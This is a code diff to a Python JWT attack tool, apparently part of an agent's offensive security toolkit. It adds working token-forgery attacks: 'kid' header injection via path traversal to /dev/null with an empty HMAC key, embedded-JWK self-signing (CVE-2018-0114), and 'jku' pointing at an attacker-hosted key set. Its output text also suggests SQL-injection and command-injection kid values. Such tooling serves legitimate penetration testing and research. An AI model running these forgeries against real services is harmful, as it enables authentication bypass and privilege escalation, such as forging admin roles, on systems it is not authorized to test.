@@ -88,6 +88,39 @@ def _sign_hs(alg: str, signing_input: bytes, secret: bytes) -> str:
     return _b64url_encode(hmac.new(secret, signing_input, algo).digest())
 
 
+def _rsa_keypair_and_jwk() -> Optional[tuple]:
+    """Generate an RS256 keypair + its public JWK (n/e). Returns (private_key, jwk) or
+    None if the optional `cryptography` package is absent. The header-injection JWT
+    attacks (jwk/jku) need RS256 signing, which stdlib can't do."""
+    try:
+        from cryptography.hazmat.primitives.asymmetric import rsa
+    except Exception:
+        return None
+    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+    nums = key.public_key().public_numbers()
+
+    def _b64uint(x: int) -> str:
+        b = x.to_bytes((x.bit_length() + 7) // 8, "big")
+        return _b64url_encode(b)
+
+    jwk = {"kty": "RSA", "kid": "attacker", "use": "sig", "alg": "RS256",
+           "n": _b64uint(nums.n), "e": _b64uint(nums.e)}
+    return key, jwk
+
+
+def _sign_rs256(private_key: Any, signing_input: bytes) -> str:
+    from cryptography.hazmat.primitives import hashes
+    from cryptography.hazmat.primitives.asymmetric import padding
+    sig = private_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
+    return _b64url_encode(sig)
+
+
+def _forge_rs256(header: dict, claims: dict, private_key: Any) -> str:
+    si = (f"{_b64url_encode(json.dumps(header, separators=(',', ':')).encode())}."
+          f"{_b64url_encode(json.dumps(claims, separators=(',', ':')).encode())}")
+    return si + "." + _sign_rs256(private_key, si.encode())
+
+
 class JwtTool(BaseTool):
     name = "jwt_tool"
     description = (
@@ -97,19 +130,35 @@ class JwtTool(BaseTool):
         "(HS256/384/512), or 'alg_none' to strip the signature (alg=none attack).\n"
         "- 'crack': dictionary-attack an HS256/384/512 secret with a wordlist (list of "
         "candidate secrets) - confirms a weak signing key.\n"
+        "HEADER-INJECTION attacks (the server trusts key material named in the token "
+        "header):\n"
+        "- 'kid_inject': forge a token whose 'kid' header points the server at a "
+        "file/value you control (path traversal like ../../../../dev/null, or /dev/null), "
+        "HMAC-signed with that file's known content ('secret', default empty). Beats "
+        "servers that do key = read(kid).\n"
+        "- 'jwk_inject': embed a self-signed public JWK in the header ('jwk') and sign "
+        "RS256 with the matching private key (CVE-2018-0114) - beats libs that trust the "
+        "embedded key.\n"
+        "- 'jku_inject': forge a token whose 'jku' header points at an attacker URL "
+        "('jku_url') and RS256-sign it; the tool emits the JWK Set to host at that URL.\n"
         "Classic wins: alg=none, a weak HMAC secret, or (for RS256 servers that also "
-        "accept HS256) signing with the RSA public key as the HMAC secret."
+        "accept HS256) signing with the RSA public key as the HMAC secret. (jwk/jku need "
+        "the optional `cryptography` package.)"
     )
     parameters = {
         "type": "object",
         "properties": {
-            "action": {"type": "string", "description": "parse | forge | crack", "default": "parse"},
+            "action": {"type": "string",
+                       "description": "parse | forge | crack | kid_inject | jwk_inject | jku_inject",
+                       "default": "parse"},
             "token": {"type": "string", "description": "The JWT to operate on"},
-            "claims": {"type": "object", "description": "forge: claim overrides to merge (e.g. {\"role\":\"admin\"})"},
-            "secret": {"type": "string", "description": "forge/crack: the HMAC secret (forge) - omit with alg_none"},
+            "claims": {"type": "object", "description": "forge/*_inject: claim overrides to merge (e.g. {\"role\":\"admin\"})"},
+            "secret": {"type": "string", "description": "forge/crack: HMAC secret; kid_inject: the content the kid resolves to (default empty)"},
             "alg_none": {"type": "boolean", "description": "forge: produce an alg=none token", "default": False},
             "wordlist": {"type": "array", "items": {"type": "string"},
                          "description": "crack: candidate secrets to try"},
+            "kid": {"type": "string", "description": "kid_inject: the 'kid' header value (e.g. ../../../../dev/null)"},
+            "jku_url": {"type": "string", "description": "jku_inject: attacker URL to host the JWK Set at"},
         },
         "required": ["action", "token"],
     }
@@ -119,6 +168,7 @@ class JwtTool(BaseTool):
     async def execute(self, action: str = "parse", token: str = "",
                       claims: Optional[dict] = None, secret: str = "",
                       alg_none: bool = False, wordlist: Optional[list] = None,
+                      kid: str = "", jku_url: str = "",
                       **kwargs: Any) -> ToolResult:
         action = (action or "parse").lower()
         try:
@@ -164,7 +214,56 @@ class JwtTool(BaseTool):
                                          metadata={"secret": cand})
             return ToolResult.ok("No candidate secret matched. Provide a larger wordlist.")
 
-        return ToolResult.fail("Unknown action. Use parse | forge | crack.")
+        if action == "kid_inject":
+            # The server resolves the signing key by reading the path/value in `kid`.
+            # Point it at a file whose content we know (default: empty, e.g. /dev/null or
+            # a traversal to it) and HMAC-sign with that content.
+            new_claims = {**payload, **(claims or {})}
+            kid_val = kid or "../../../../../../dev/null"
+            h = {**header, "alg": "HS256", "kid": kid_val}
+            si = (f"{_b64url_encode(json.dumps(h, separators=(',', ':')).encode())}."
+                  f"{_b64url_encode(json.dumps(new_claims, separators=(',', ':')).encode())}")
+            tok = si + "." + _sign_hs("HS256", si.encode(), (secret or "").encode())
+            return ToolResult.ok(
+                f"kid-injection token (kid={kid_val!r}, HMAC key={secret or '(empty)'!r}):\n"
+                f"{tok}\n\nWorks if the server builds the HMAC key from read(kid). Empty "
+                "key targets a kid that resolves to empty/predictable content; also try "
+                "kid values like '/dev/null', or a SQLi/command-injection kid on stacks "
+                "that look the key up dynamically.",
+                metadata={"kid": kid_val})
+
+        if action in ("jwk_inject", "jku_inject"):
+            kp = _rsa_keypair_and_jwk()
+            if kp is None:
+                return ToolResult.fail(
+                    f"{action} needs the optional `cryptography` package to RS256-sign. "
+                    "Install it (pip install cryptography) and retry.")
+            priv, jwk = kp
+            new_claims = {**payload, **(claims or {})}
+            base_h = {k: v for k, v in header.items() if k not in ("jwk", "jku", "x5u")}
+            if action == "jwk_inject":
+                h = {**base_h, "alg": "RS256", "kid": jwk["kid"], "jwk": jwk}
+                tok = _forge_rs256(h, new_claims, priv)
+                return ToolResult.ok(
+                    "jwk-injection token (self-signed key embedded in the header, "
+                    "CVE-2018-0114):\n" + tok + "\n\nBeats libraries that verify against "
+                    "the token's OWN embedded 'jwk' instead of a trusted key.",
+                    metadata={"attack": "jwk"})
+            # jku_inject
+            if not jku_url:
+                return ToolResult.fail("jku_inject needs 'jku_url' (where you'll host the JWK Set).")
+            h = {**base_h, "alg": "RS256", "kid": jwk["kid"], "jku": jku_url}
+            tok = _forge_rs256(h, new_claims, priv)
+            jwks = json.dumps({"keys": [jwk]}, indent=2)
+            return ToolResult.ok(
+                f"jku-injection token (jku={jku_url}):\n{tok}\n\n"
+                f"HOST THIS JWK Set at {jku_url} so the server fetches it and trusts the "
+                f"key:\n{jwks}\n\nWorks if the server fetches the key from the "
+                "attacker-controlled jku URL without allow-listing the host.",
+                metadata={"attack": "jku", "jku_url": jku_url})
+
+        return ToolResult.fail(
+            "Unknown action. Use parse | forge | crack | kid_inject | jwk_inject | jku_inject.")
 
 
 # ------------------------------------------------------------------ #
